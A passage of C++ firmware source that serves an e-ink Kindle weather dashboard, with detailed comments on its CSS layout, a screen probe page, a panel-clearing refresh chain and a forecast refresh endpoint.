    // ── The top block: two columns ──────────────────────────────────────────
    // Palette: #000 #444 #777 #aaa #d8d8d8 #fff. The panel has 16 real grey
    // levels — the dithering that argued against greys here comes from
    // gradients and from tones too close together, not from flat
    // well-separated fills. Spaced this far apart each renders solid.
    KD_S(".top td{padding:")                  KD_N(2)
    KD_S("px 0 ")                             KD_N(4)
    KD_S("px}")

    // Two classes, not one: .top td above is (0,1,1) and would otherwise
    // outrank a bare .sep (0,1,0), zeroing this padding and letting the rule
    // sit against the first glyph of the indoor block.
    KD_S(".top .sep{border-left:")             KD_N(1)
    KD_S("px solid #aaa;padding-left:")        KD_N(30)
    KD_S("px}")

    // The badge sits on the heading's own line, pushed right. float and not
    // flex: this page is built for a browser that may be WebKit 531, where
    // flexbox does not exist. A float has worked since 1996.
    // AND A NEGATIVE BOTTOM MARGIN, so a low battery never reflows the page.
    // The badge is a fixed 22 px tall in a caption line that is 20; floats
    // count towards the height of a table cell, so the two pixels it stood
    // proud by moved everything under it down on exactly the readers whose
    // battery is going. Pulling its margin box back inside the line makes the
    // page the same height whether the badge is drawn or not, which is what
    // tools/kindle_preview/README.md asks anyone changing this to check.
    KD_S(".bw{float:right;margin-top:") KD_N(-2)
    KD_S("px;margin-bottom:")           KD_N(-4)
    KD_S("px}")

    // ONE CAPTION STYLE FOR THE WHOLE PAGE. The group headings, the cell
    // captions and the section rules below all use it, so a reader who has
    // learnt what small tracked grey means on this page has learnt it once.
    KD_S(".lab{font-size:")                   KD_N(14)
    KD_S("px;letter-spacing:")                KD_N(2)
    KD_S("px;text-transform:uppercase;margin-bottom:") KD_N(2)
    KD_S("px;color:#777;white-space:nowrap;overflow:hidden}")

    // ── The headline ────────────────────────────────────────────────────────
    // HERO and BIG on one baseline with a slash between them. They are usually
    // one measurement of one parcel of air — 8.4° / 71% — and a line break
    // between those two puts a paragraph boundary through a single reading.
    //
    // nowrap and hidden rather than a smaller face at some width: the pair is
    // the one thing on the page that must not reflow, and the sizes below were
    // measured against the widest it gets, -12.4° / 100%.
    KD_S(".head{line-height:1.02;white-space:nowrap;overflow:hidden;letter-spacing:-")
    KD_N(1)
    KD_S("px}")
    KD_S(".v1{font-size:")                    KD_N(88)
    KD_S("px}")
    KD_S(".v2{font-size:")                    KD_N(52)
    KD_S("px;color:#444;letter-spacing:")     KD_N(-1)
    KD_S("px}")
    KD_S(".slash{font-size:")                 KD_N(52)
    KD_S("px;color:#aaa;letter-spacing:0;padding:0 ") KD_N(7)
    KD_S("px;position:relative;top:")         KD_N(-5)
    KD_S("px}")

    // The 24 h low-to-high and the age, on one line under the headline.
    // The 24 h low-to-high and the age, on one line under the headline. Set in
    // the page's mid grey rather than its dark one: it is context for the big
    // number above it, not a reading in its own right, and at #444 it competed
    // with the grid underneath. Switchable off entirely — see KSHOW_RANGE.
    KD_S(".sub{font-size:")                   KD_N(17)
    KD_S("px;margin-top:")                    KD_N(4)
    KD_S("px;line-height:1.45;color:#777;white-space:nowrap;overflow:hidden}")
    KD_S(".dim{color:#777}")

    // ── The two-by-two grid, and the indoor row ─────────────────────────────
    // The same shape at two sizes: caption above, value under it. A caption on
    // the value's own line would be denser, and it also makes every cell a
    // different width — six captions of different lengths put six numbers at
    // six different x. Above the value they all start at the cell's left edge.
    //
    // table-layout:fixed so the width attribute is obeyed. Without it the
    // browser sizes columns by content and a four-digit pressure beside a
    // two-digit humidity takes space the layout had allocated.
    KD_S(".grid,.inrow{table-layout:fixed;margin-top:") KD_N(8)
    KD_S("px}")
    KD_S(".grid td,.inrow td{padding:0 ")     KD_N(10)
    KD_S("px 0 0;vertical-align:top}")
    // A headline with nothing beside it, and a grid row of one, are centred
    // in their column — see appendOutdoor().
    KD_S(".ctr{text-align:center}.grid td.c1{text-align:center;padding:0}")
    KD_S(".cv{line-height:1.0;white-space:nowrap;overflow:hidden;letter-spacing:-")
    KD_N(1)
    KD_S("px}")
    // THE INDOOR ROW ALIGNS ALONG ITS BOTTOM, not its top. The first field has
    // no caption and is half again as tall as the other two, so aligning tops
    // would leave those two floating above a much larger number. The value is
    // the last thing in every cell, so bottom alignment puts all three on one
    // edge and pushes the two captions up into the space the big one does not
    // use — which is the space its missing caption gave back.
    // AND CARRIES LESS RIGHT PADDING THAN THE GRID. The top block is a
    // content-sized two-column table, so the widest headline the page draws —
    // -12.4° / 100% — is also the arrangement that leaves the indoor row its
    // narrowest. At 10 px of gutter the first cell had 90 px of content box for
    // a "21.0°" that measures 94, and .cv clips: the degree sign, on the one
    // indoor number anybody reads, simply was not drawn. 6 px is what fits it,
    // and a 6 px gutter beside a legible degree beats a 10 px one beside none.
    KD_S(".inrow td{vertical-align:bottom;padding-right:") KD_N(6)
    KD_S("px}")
    KD_S(".gv{font-size:")                    KD_N(34)
    KD_S("px}")
    // Three across is a third of half a page, which "1008 hPa" with a tendency
    // arrow after it does not fit at the two-across size. The row carries the
    // class, so a page with three in one row and two in the next sets each row
    // at the size its own width can hold.
    KD_S(".grid-3 .gv{font-size:")            KD_N(27)
    KD_S("px}")
    KD_S(".iv{font-size:")                    KD_N(31)
    KD_S("px}")
    // The first indoor field is the one the reader looks at, so it is larger by
    // TYPE and not by width — the columns stay equal, which is what keeps the
    // row aligned whether it holds three fields or two.
    // The first indoor field spends its caption's line on type instead: the
    // heading above already says which room this is, so a "TEMP" under it says
    // nothing the degree sign has not.
    KD_S(".iv-1{font-size:")                  KD_N(52)
    KD_S("px}")
    KD_S(".val-b{font-weight:700}")
    // Extra bold: the heaviest the face has, thickened by a shadow either side
    // for a face whose bold is its heaviest.
    KD_S(".val-x{font-weight:900;text-shadow:1px 0,-1px 0}")
    // White on black, for a place set that way.
    KD_S(".inv,.invp{background:#000}.inv *,.wi *{color:#fff!important}")

    // How dark a value is drawn, per place. Black is the default and carries no
    // class at all, so a page nobody has touched emits none of these.
    KD_S(".ink-d{color:#444}")
    KD_S(".ink-m{color:#777}")
    KD_S(".ink-l{color:#aaa}")

    // A unit is a footnote to its number, not a second number.
    KD_S(".unit{font-size:0.42em;font-weight:400;color:#444;letter-spacing:0}")
    // The degree, set as the design has always set it: small, at the cap line
    // rather than on the baseline. In em so that one rule serves every size on
    // the page — a pixel offset tuned on the headline is wrong on a grid cell.
    // top is relative to the DEGREE's own size, which is why 0.38 here is the
    // same proportion the fixed 12 px on a 30 px glyph was.
    KD_S(".unit-d{font-size:0.34em;vertical-align:top;line-height:1;"
         "position:relative;top:0.38em}")
    // The three-hour tendency arrow, for the place that asked for one.
    KD_S(".tend{font-size:0.5em;color:#444;letter-spacing:0;padding-left:0.15em}")

    // ── The clock ───────────────────────────────────────────────────────────
    // THE FIXED HEIGHT IS GONE, and the comment that used to justify it with
    // it: it existed to keep a divider level with the indoor block, and that
    // block now sits under the clock in the same column rather than beside it.
    // What was alignment had become 35 px of empty cell, on a page whose whole
    // budget is one 800 px screen with no scrollbar to reveal what falls off.
    KD_S(".clock{font-size:")                 KD_N(96)
    KD_S("px;line-height:")                   KD_N(100)
    KD_S("px;letter-spacing:")                KD_N(-4)
    KD_S("px}")
    KD_S(".clock-x{font-size:")               KD_N(44)
    KD_S("px;line-height:")                   KD_N(100)
    KD_S("px;color:#777;letter-spacing:0}")
    // The hairline between the clock and the indoor block. Lighter than the
    // page's section rules: it separates two things inside one column, where
    // .rule separates the columns from what is under them.
    KD_S(".inrule{border-top:")               KD_N(1)
    KD_S("px solid #d8d8d8;margin:")          KD_N(8)
    KD_S("px 0 ")                             KD_N(6)
    KD_S("px}")

    // Three rules on the page, so a few px each is what keeps the footer above
    // the fold. Measured, not guessed.
    KD_S(".rule{border-top:")                 KD_N(1)
    KD_S("px solid #aaa;margin:")             KD_N(8)
    KD_S("px 0 ")                             KD_N(6)
    KD_S("px}")
    KD_S(".sec{font-size:")                   KD_N(15)
    KD_S("px;letter-spacing:")                KD_N(4)
    KD_S("px;text-transform:uppercase;margin-bottom:") KD_N(6)
    KD_S("px;color:#777}")

    KD_S(".ico{vertical-align:top;padding-top:") KD_N(4)
    KD_S("px}")
    KD_S(".fc{font-size:")                    KD_N(31)
    KD_S("px;line-height:1.1;padding-left:")  KD_N(12)
    KD_S("px}")
    KD_S(".fc-t{font-size:")                  KD_N(33)
    KD_S("px;margin-top:")                    KD_N(1)
    KD_S("px;color:#000}")

    // Equal thirds of the right half; nowrap so a two-part daily figure never
    // breaks across lines.
    KD_S(".per{width:")                       KD_N(88)
    KD_S("px;text-align:center;vertical-align:top;white-space:nowrap;"
         "background:#f0f0f0;border-left:")   KD_N(4)
    KD_S("px solid #fff}")
    KD_S(".per-l{font-size:")                 KD_N(14)
    KD_S("px;letter-spacing:")                KD_N(2)
    KD_S("px;text-transform:uppercase;margin-bottom:") KD_N(1)
    KD_S("px;color:#777;padding-top:")        KD_N(3)
    KD_S("px}")
    KD_S(".per-t{font-size:")                 KD_N(22)
    KD_S("px;margin-top:")                    KD_N(-2)
    KD_S("px;padding-bottom:")                KD_N(5)
    KD_S("px}")

    KD_S(".chart{display:block;margin:")      KD_N(2)
    KD_S("px auto 0}")
    KD_S(".grid{stroke:#c4c4c4;stroke-width:") KD_N(1)
    KD_S("}.vgrid{stroke:#d5d5d5;stroke-width:") KD_N(1)
    KD_S("}.base{stroke:#777;stroke-width:")  KD_N(1)
    KD_S("}.ax{font-size:")                   KD_N(14)
    KD_S("px;fill:#777;font-family:Bookerly,Georgia,serif}")
    KD_S(".band{fill:#d8d8d8;stroke:#8f8f8f;stroke-width:") KD_N(1)
    KD_S("}.l-out{fill:none;stroke:#000;stroke-width:") KD_N(3)
    KD_S("}.l-in{fill:none;stroke:#777;stroke-width:") KD_N(2)
    KD_S(";stroke-dasharray:")                KD_N(7)
    KD_S(" ")                                 KD_N(5)
    KD_S("}")

    KD_S(".key{font-size:")                   KD_N(15)
    KD_S("px;margin-top:")                    KD_N(2)
    KD_S("px;color:#444}")
    KD_S(".key td{padding-top:")              KD_N(2)
    KD_S("px}")
    KD_S(".note{font-size:")                  KD_N(17)
    KD_S("px;font-style:italic;text-align:center;padding:") KD_N(36)
    KD_S("px 0;color:#777}")

    // Tighter under its heading than the two sections above: the strip is a
    // row of blocks, not a paragraph, and the extra gap was what pushed the
    // footer below the fold.
    KD_S(".sec-wk{margin-bottom:")            KD_N(3)
    KD_S("px}")
    KD_S(".wk{margin-top:")                   KD_N(2)
    KD_S("px}")
    KD_S(".wd{width:14.28%;text-align:center;padding:") KD_N(6)
    KD_S("px 0 ")                             KD_N(5)
    KD_S("px;background:#f4f4f4}")
    KD_S(".wd-we{background:#e4e4e4}")
    KD_S(".wd-n{font-size:")                  KD_N(14)
    KD_S("px;letter-spacing:")                KD_N(2)
    KD_S("px;text-transform:uppercase;color:#777}")
    KD_S(".wd-d{font-size:")                  KD_N(30)
    KD_S("px;line-height:1.15}")

    // Inverted rather than outlined: a filled block is the one mark that stays
    // unambiguous after e-ink dithering, where a thin ring can read as a smudge.
    KD_S(".wd-now{background:#000;color:#fff}")

    // The forecast in the week strip (appendWeekFc): the calendar's cells and
    // its heading's height, the current day framed rather than inverted.
    KD_S(".wf .wd{height:")                   KD_N(77)
    KD_S("px;vertical-align:top;padding:")    KD_N(3)
    KD_S("px 0}")
    KD_S(".wf .wd-now{background:#f4f4f4;color:#111;outline:") KD_N(3)
    KD_S("px solid #000;outline-offset:-")    KD_N(3)
    KD_S("px}")
    KD_S(".wf svg{display:block;margin:")     KD_N(2)
    KD_S("px auto}")
    KD_S(".wf-t{font-size:")                  KD_N(16)
    KD_S("px;line-height:1.15}")

    KD_S(".foot{border-top:")                 KD_N(1)
    KD_S("px solid #aaa;margin-top:")         KD_N(6)
    KD_S("px;font-size:")                     KD_N(15)
    KD_S("px;color:#555;letter-spacing:.5px}")
    KD_S(".foot td{padding-top:")             KD_N(4)
    KD_S("px}")

    // Boxed rather than underlined so the target is visible before it is
    // touched, which on a panel with no hover state is the only chance.
    //
    // SIZE, HONESTLY: this comes to 78x27 CSS px, which is about 12x4 mm on
    // any of the readers this page targets — a 300 ppi Paperwhite scaling 600
    // CSS px across 1072 device px and a 167 ppi Kindle 7 mapping them 1:1
    // work out to the same 0.15 mm per CSS px. An earlier version of this
    // comment cited "44 device px" as the guideline met; that was wrong twice
    // over. The 44 in the usual guidance is CSS px on a phone, roughly 9 mm,
    // and 4 mm is under half of it. It is reachable with an infrared touch
    // panel but it is not generous. The type inside it grew with the rest of
    // the small end of the scale, which is where the extra height went: the
    // page finishes at 778 of 800 and has none left over to make the box
    // itself taller.
    KD_S(".act{text-align:right;white-space:nowrap}")
    KD_S(".act a{display:inline-block;border:")  KD_N(1)
    KD_S("px solid #777;color:#000;text-decoration:none;padding:") KD_N(4)
    KD_S("px ")                                  KD_N(12)
    KD_S("px;margin-left:")                      KD_N(8)
    KD_S("px;font-size:")                        KD_N(15)
    KD_S("px;letter-spacing:")                   KD_N(1)
    KD_S("px;background:#f4f4f4}")

    // ── The standalone page ─────────────────────────────────────────────────
    // The forecast band is an eighth of this page, and on a collector that is
    // its own access point nothing can ever fill it. body.sa is that page: the
    // band goes, and every number in the top block grows into it.
    //
    // EMITTED UNCONDITIONALLY, as an override, rather than branched into the
    // rules above. The sheet above is the design and is replayed as plain text
    // by tools/kindle_preview and by tools/check_kindle_parity.py — a branch in
    // it would put both arms of the choice into their picture at once. A class
    // on <body> costs one attribute and keeps the sheet a statement of fact.
    //
    // Every size here has a twin in kindle/layout/600x800-standalone.conf, and
    // check_kindle_parity.py holds the two together the same way it holds the
    // design and the base layout together.
    // ── WHY A SIXTH AND NOT A THIRD ─────────────────────────────────────────
    // The band that was freed is vertical; the columns are the width they
    // always were, and every number here is limited by the column it sits in.
    // "1008 hPa" three across is 87 px of a 90 px cell at 31; "21.4°" is 110 of
    // the indoor row's first 111 at 56; "17:40" is 260 of the clock's 264 at
    // 110. A size a third larger overruns on the day the pressure goes to four
    // digits, and neither renderer wraps — the browser clips and FBInk draws
    // straight over its neighbour. The height left over becomes air, which is
    // what a panel read from across a room wants anyway.
    KD_S(".sa .lab{font-size:")               KD_N(15)
    KD_S("px}")
    KD_S(".sa .v1{font-size:")                KD_N(104)
    KD_S("px}")
    KD_S(".sa .v2{font-size:")                KD_N(57)
    KD_S("px}")
    KD_S(".sa .slash{font-size:")             KD_N(57)
    KD_S("px;padding:0 ")                     KD_N(8)
    KD_S("px;top:")                           KD_N(-6)
    KD_S("px}")
    KD_S(".sa .sub{font-size:")               KD_N(19)
    KD_S("px}")
    KD_S(".sa .gv{font-size:")                KD_N(42)
    KD_S("px}")
    KD_S(".sa .grid-3 .gv{font-size:")        KD_N(31)
    KD_S("px}")
    KD_S(".sa .iv{font-size:")                KD_N(34)
    KD_S("px}")
    KD_S(".sa .iv-1{font-size:")              KD_N(56)
    KD_S("px}")
    // The plain clock; the three styles carry their own twins in kdSkinCss(),
    // which is emitted after this and has to win against it.
    KD_S(".sa .clock{font-size:")             KD_N(110)
    KD_S("px;line-height:")                   KD_N(114)
    KD_S("px}")
    KD_S(".sa .clock-x{font-size:")           KD_N(48)
    KD_S("px;line-height:")                   KD_N(114)
    KD_S("px}")
    );

    #undef KD_S
    #undef KD_N

    // Everything above is the design and is emitted unconditionally; anything
    // the reader has chosen goes here, as overrides. See KindleSkin.h for why
    // the two are kept apart — briefly: the preview tool reconstructs the
    // sheet above by reading this source, and a branch in it would put every
    // arm of every choice into the picture at once.
    kdSkinCss(p, skin);

    // And last, the layout for what is on this page — the sizes and heights
    // KindleFlow.h worked out. After the clock style, because the clock's size
    // is one of the things it decides.
    kdFlowCss(p, rd.flow, skin.clockStyle, [](int v) { return kdPx(v); });
    if (rd.flow.wall) kdWallCss(p, skin, rd.flow);

    kdRotCss(p, rot);

    // A screen wider than the page fitted to it: the page in the middle of it.
    // Only when the screen is known — the page that never asked stays as it was.
    if (pg.screenW > pg.w) {
        p += F("body{width:"); p += pg.w; p += F("px;margin:0 auto}");
        if (rot != KROT_0) { p += F(".rot{left:"); p += (pg.screenW - pg.w) / 2; p += F("px}"); }
    }

    p += F("</style></head><body>");
    // Turned, the page is drawn upright in a box the size of the turned page
    // and the box is rotated onto the screen — see kdRotCss().
    if (rot != KROT_0) p += F("<div class=\"rot\">");

    if (rd.flow.wall) {
        appendWallBody(p, skin, now, rd);
    } else if (rd.flow.land) {
        appendLandBody(p, skin, now, rd, tOut, tIn, haveOut, haveIn);
    } else {
        // No masthead. The place name never changed and the date is carried by the
        // week strip at the foot, so the row was two lines of furniture above the
        // only two numbers the page exists to show. The top block is the masthead.
        //
        // THE SAME ELEVEN PLACES THE FBINK RENDERER DRAWS, resolved by the same call,
        // so "what is in this place" has one answer on this device rather than one
        // per screen.
        appendTopBlock(p, skin, now, rd);

        if (skin.showFlags & KSHOW_CHART)
            appendChartSection(p, rd, tOut, tIn, haveOut, haveIn, true);

#ifdef MODULE_FORECAST_ENABLED
        // Last, deliberately: the measured values are what the reader came for and
        // the forecast is the supporting note, so it reads as a footnote rather
        // than as something competing with the two temperatures.
        //
        // AND NOT AT ALL IN STANDALONE. This used to be settled at build time
        // alone, so a collector built with the module and then run on its own AP
        // served the section with a circled question mark in it — furniture, in
        // the one place on the page where the readings could have been.
        // The hours in the outlook whenever the week strip holds the days:
        // the same days twice on one page would be a strip and a half of
        // nothing new.
        if (rd.flow.forecast) appendForecastSection(p, 3, kdWeekFcOn(skin, now));
#endif

        if (skin.showFlags & KSHOW_WEEK) appendWeekStrip(p, skin, now);
    }

    // The footer carries the two manual repaints. Links rather than anything
    // scripted, so a five-way pad reaches them as readily as a fingertip. See
    // the .act rule for what the padding actually buys, and for why the size
    // is smaller than the usual touch guidance rather than meeting it.
    p += F("<table class=\"foot\"><tr><td>");
    {
        // THROUGH appendEscaped, because the note carries the AP's name and
        // that is a string somebody typed. It reaches this page the same way a
        // slot label does — see the note above appendEscaped() — and a page
        // served without authentication is not the place to make an exception
        // for a string that merely looks harmless.
        char note[96];
        kdFooterNote(note, sizeof(note));
        appendEscaped(p, note);
    }
    const String ra = kdRotArg(req, '?');
    p += F("</td><td class=\"act\"><a href=\"/kindle");
    p += ra;
    p += F("\">");
    p += kdT("refresh", "обнови");
    p += F("</a><a href=\"/kindle/clear");
    p += ra;
    p += F("\">");
    p += kdT("clear", "изчисти");
    p += F("</a>");
#ifdef MODULE_FORECAST_ENABLED
    // Not on an access point, which has no route to the provider. Offered
    // on the standalone page otherwise: a forecast six hours stale is one of
    // the things that turns the page standalone, and it is exactly the moment
    // somebody wants to ask for a fresh one.
    if (forecastModule.isEnabled() && !apModeTriggered) {
        p += F("<a href=\"/kindle/forecast");
        p += ra;
        p += F("\">");
        p += kdT("forecast", "прогноза");
        p += F("</a>");
    }
#endif
    p += F("</td></tr></table>");
    if (rot != KROT_0) p += F("</div>");
    p += F("</body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    // The meta tag drives the refresh, so nothing may be served from cache: an
    // e-ink browser holding a stale page is indistinguishable from a dead
    // sensor, and there is no spinner to give the game away.
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

// FOUR SERIES, AND THE READER CHOOSES THEM. The ring holds TrendRing::MAX_SERIES
// and each costs RAM all day, so a place's "24 h line" (KSLOTF_LINE) picks
// one rather than adding to them. In this order, while there is room: the
// outdoor temperature (the chart, the wall's headline line), the headline's
// own reading (its 24 h low-to-high), then in place order the places that
// asked for a line or a pressure tendency arrow, then what was always kept —
// the indoor temperature for the chart, the outdoor pressure and humidity.
struct KdWant { const char* id[TrendRing::MAX_SERIES]; const char* m[TrendRing::MAX_SERIES]; int n; };
static void __attribute__((noinline)) kdWant(KdWant& w, const char* id, const char* m) {
    if (w.n >= TrendRing::MAX_SERIES || !*id) return;
    for (int i = 0; i < w.n; i++)
        if (!strcmp(w.id[i], id) && !strcmp(w.m[i], m)) return;
    w.id[w.n] = id; w.m[w.n++] = m;
}

static bool s_slotsLoaded = false;   // at boot — see registerKindleDashboard()

void kindleTrackTrends(bool load) {
    if (load && configFs()) {
        kdSlotsBegin(*configFs(), outdoorSensorId(), indoorSensorId());
        s_slotsLoaded = true;
    }
    KdWant w; w.n = 0;
    kdWant(w, outdoorSensorId(), "temperature");
    if (kdSlots().z[KZ_HERO].used()) kdWant(w, kdSlots().z[KZ_HERO].sensorId, kdSlots().z[KZ_HERO].metric);
    for (const KindleSlot& sl : kdSlots().z)
        if (sl.used() && ((sl.flags & KSLOTF_LINE) ||
                          ((sl.flags & KSLOTF_TREND) && !strcmp(sl.metric, "pressure"))))
            kdWant(w, sl.sensorId, sl.metric);
    kdWant(w, indoorSensorId(), "temperature");
    kdWant(w, outdoorSensorId(), "pressure");
    kdWant(w, outdoorSensorId(), "humidity");
    trendRing.keepOnly(w.id, w.m, w.n);
    for (int i = 0; i < w.n; i++) trendRing.track(w.id[i], w.m[i]);
}

// ---------------------------------------------------------------------------
// GET /kindle/probe — what this reader's browser says its screen is
// ---------------------------------------------------------------------------
// The right layout width depends on what the reader's browser reports for its
// viewport and devicePixelRatio, and that is a question only the device can
// answer. Rather than guess, load this on the reader and read the numbers off.
//
// This is the one page here that uses JavaScript, because the numbers it exists
// to print are only knowable from inside the browser. It degrades: the user
// agent comes from the request header and is printed server-side, so an older
// firmware that runs nothing still tells you which browser it is.
//
// The ruler underneath needs no script at all. Each bar is a fixed pixel width
// declared under a viewport pinned to the width it is testing, so whichever bar
// reaches the right edge names the value to build with.
static void handleKindleProbe(AsyncWebServerRequest* req) {
    String p;
    p.reserve(2600);

    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    // Kept plain: every byte here is flash on a build with none to spare.
    p += F("\"><title>Kindle probe</title><style>"
           "body{font:15px Georgia,serif;margin:16px}"
           ".bar{background:#ddd;border-left:2px solid #000;margin-bottom:3px;"
           "font-size:12px;white-space:nowrap}</style></head><body>");

    p += F("<p>Default width <b>");
    p += PAGE_W;
    p += F(" px</b>.</p><p id=\"r\">No JavaScript: use the bars below.</p>"
           "<script>document.getElementById('r').innerHTML="
           "'innerWidth <b>'+window.innerWidth+'</b> &middot; innerHeight <b>'"
           "+window.innerHeight+'</b><br>devicePixelRatio <b>'"
           "+(window.devicePixelRatio||1)+'</b> &middot; screen '"
           "+screen.width+'&times;'+screen.height"
           // The address to bookmark on this reader: the page laid out for the
           // screen it just reported, whatever the Device setting says.
           "+'<br><a href=\"/kindle?scr='+screen.width+'x'+screen.height+'\">"
           "/kindle?scr='+screen.width+'x'+screen.height+'</a>';</script>");

    // Server-side, so it survives a browser that will not run the script.
    p += F("<p>User agent:<br>");
    if (req->hasHeader("User-Agent")) {
        String ua = req->header("User-Agent");
        ua.replace("<", "&lt;");
        p += ua;
    } else {
        p += F("(not sent)");
    }
    p += F("</p>");

    // 320 is below anything this layout supports and 1072 is the panel's own
    // pixel count; a bar that overflows tells you as much as one that fits.
    p += F("<p>Build with the widest bar that fits:</p>");
    static const int CANDIDATES[] = { 1072, 800, 768, 700, 600, 536, 480, 400 };
    for (unsigned i = 0; i < sizeof(CANDIDATES) / sizeof(CANDIDATES[0]); i++) {
        p += F("<div class=\"bar\" style=\"width:");
        p += CANDIDATES[i];
        p += F("px\">");
        p += CANDIDATES[i];
        p += F("</div>");
    }

    p += F("<p><a href=\"/kindle\">Dashboard</a></p></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

// ---------------------------------------------------------------------------
// GET /kindle/clear — drive the panel to both extremes, then come back
// ---------------------------------------------------------------------------
// E-ink keeps a ghost of what it drew before. A page of mostly-white text and
// hairlines never asks the controller for a full waveform, so the ghost of a
// heavier layout can sit under it for hours. What clears it is driving every
// pixel to black and to white a few times, which is what the reader's own
// "refresh" does and what no ordinary page can ask for.
//
// So this is a chain of full-screen frames, alternating, each meta-refreshing
// to the next and the last one back to the dashboard. Four frames: fewer
// leaves a faint ghost of the heaviest block, more is time spent staring at a
// flashing screen for no further gain.
//
// The step is clamped rather than trusted. It arrives in a query string, so it
// is reader-supplied, and an unbounded value would let a stray link build a
// chain that never returns to the dashboard.
static void handleKindleClear(AsyncWebServerRequest* req) {
    static const int FRAMES = 4;

    int step = 1;
    if (const String* v = queryArg(req, "s")) {
        step = v->toInt();
        if (step < 1)       step = 1;
        if (step > FRAMES)  step = FRAMES;
    }

    const bool black = (step % 2) == 1;

    String p;
    p.reserve(500);
    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    p += F("\"><meta http-equiv=\"refresh\" content=\"1;url=/kindle");
    if (step < FRAMES) { p += F("/clear?s="); p += (step + 1); p += kdRotArg(req, '&'); }
    else p += kdRotArg(req, '?');
    p += F("\"><title>...</title><style>html,body{margin:0;padding:0;height:100%;"
           "background:");
    p += black ? F("#000") : F("#fff");
    p += F("}</style></head><body></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}

#ifdef MODULE_FORECAST_ENABLED
// ---------------------------------------------------------------------------
// GET /kindle/forecast — fetch the forecast now, then come back
// ---------------------------------------------------------------------------
// The footer link on /kindle, the button on the Modules page and the tap menu
// on the panel all land here. It only asks: the fetch runs on the export task
// a moment later (see ForecastModule::requestRefresh), so the page says so and
// then waits for it: it meta-refreshes to ?w=<n>, which asks nothing and only
// looks whether the fetch is still queued or in flight, every few seconds,
// and goes back to the dashboard once it is not. Capped, so a fetch that
// hangs — two HTTPS requests at six seconds' timeout each, for OWM, at the
// worst — cannot keep the reader on this page.
//
// A GET, like /kindle/clear, because the reader's browser follows links and
// submits nothing, and the side effect is one rate-limited forecast request.
//
// ?t=1 answers in one plain line instead — "ok", "wait <s>", "off" or
// "offline" — for the panel's script and the Modules page, which have no use
// for a page. "offline" means the collector has no station link (AP mode, or
// the network is down), so nothing was queued. After "ok" those callers poll
// "pending" in /api/modules/forecast, or ?t=1&w=1, which answers "pending" or
// "done" without asking for anything.
static void handleKindleForecast(AsyncWebServerRequest* req) {
    static const int POLL_S = 3, POLL_MAX = 15;   // 45 s, the most we wait

    const bool text = req->hasParam("t");

    // ?w=<n>: a poll, not a request.
    if (const String* v = queryArg(req, "w")) {
        int step = v->toInt();
        if (step < 1)        step = 1;
        if (step > POLL_MAX) step = POLL_MAX;
        const bool busy = forecastModule.refreshPending();
        if (text) {
            AsyncWebServerResponse* res = req->beginResponse(
                200, "text/plain", busy ? "pending" : "done");
            res->addHeader("Cache-Control", "no-store");
            req->send(res);
            return;
        }
        String p;
        p.reserve(420);
        p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
               "<meta name=\"viewport\" content=\"width=");
        p += PAGE_W;
        p += F("\"><meta http-equiv=\"refresh\" content=\"");
        if (busy && step < POLL_MAX) {
            p += POLL_S;
            p += F(";url=/kindle/forecast?w=");
            p += (step + 1);
            p += kdRotArg(req, '&');
        } else {
            p += F("0;url=/kindle");
            p += kdRotArg(req, '?');
        }
        p += F("\"><title>...</title><style>body{margin:0;padding:40% 8% 0;"
               "font:24px sans-serif;text-align:center}</style></head><body><p>");
        p += kdT("Updating the forecast&hellip;", "Обновявам прогнозата&hellip;");
        p += F("</p></body></html>");
        AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
        res->addHeader("Cache-Control", "no-store");
        req->send(res);
        return;
    }

    uint32_t waitS = 0;
    const auto r = forecastModule.requestRefresh(millis(), waitS);

    if (text) {
        char line[16];
        if (r == ForecastModule::REFRESH_QUEUED)       strcpy(line, "ok");
        else if (r == ForecastModule::REFRESH_WAIT)    snprintf(line, sizeof(line), "wait %lu", (unsigned long)waitS);
        else if (r == ForecastModule::REFRESH_OFFLINE) strcpy(line, "offline");
        else                                           strcpy(line, "off");
        AsyncWebServerResponse* res = req->beginResponse(200, "text/plain", line);
        res->addHeader("Cache-Control", "no-store");
        req->send(res);
        return;
    }

    String p;
    p.reserve(560);
    p += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
           "<meta name=\"viewport\" content=\"width=");
    p += PAGE_W;
    p += F("\"><meta http-equiv=\"refresh\" content=\"");
    if (r == ForecastModule::REFRESH_QUEUED) {
        p += POLL_S;
        p += F(";url=/kindle/forecast?w=1");
        p += kdRotArg(req, '&');
    } else {
        p += F("4;url=/kindle");
        p += kdRotArg(req, '?');
    }
    p += F("\"><title>...</title><style>body{margin:0;padding:40% 8% 0;"
           "font:24px sans-serif;text-align:center}</style></head><body><p>");
    if (r == ForecastModule::REFRESH_QUEUED) {
        p += kdT("Updating the forecast&hellip;", "Обновявам прогнозата&hellip;");
    } else if (r == ForecastModule::REFRESH_WAIT) {
        p += kdT("Updated under a minute ago. Try again in ",
                 "Обновена е преди по-малко от минута. Опитай след ");
        p += waitS;
        p += F(" s.");
    } else if (r == ForecastModule::REFRESH_OFFLINE) {
        p += kdT("The collector is offline, so it cannot fetch a forecast.",
                 "Колекторът е без интернет и не може да изтегли прогноза.");
    } else {
        p += kdT("The forecast is off, or has no location set.",
                 "Прогнозата е изключена или няма зададено място.");
    }
    p += F("</p></body></html>");

    AsyncWebServerResponse* res = req->beginResponse(200, "text/html", p);
    res->addHeader("Cache-Control", "no-store");
    req->send(res);
}
#endif

// ORDER IS LOAD-BEARING. AsyncCallbackWebHandler::canHandle matches when the
// request URL equals its uri OR starts with uri + "/", and _attachHandler
// takes the first handler that matches, in registration order. So "/kindle"
// registered first swallows "/kindle/probe" and "/kindle/clear": both were
// silently unreachable, and the pages simply rendered the dashboard instead.
// The children go first.
void registerKindleDashboard(AsyncWebServer& server) {
    // Loaded here rather than in setup(): registration is the first moment the
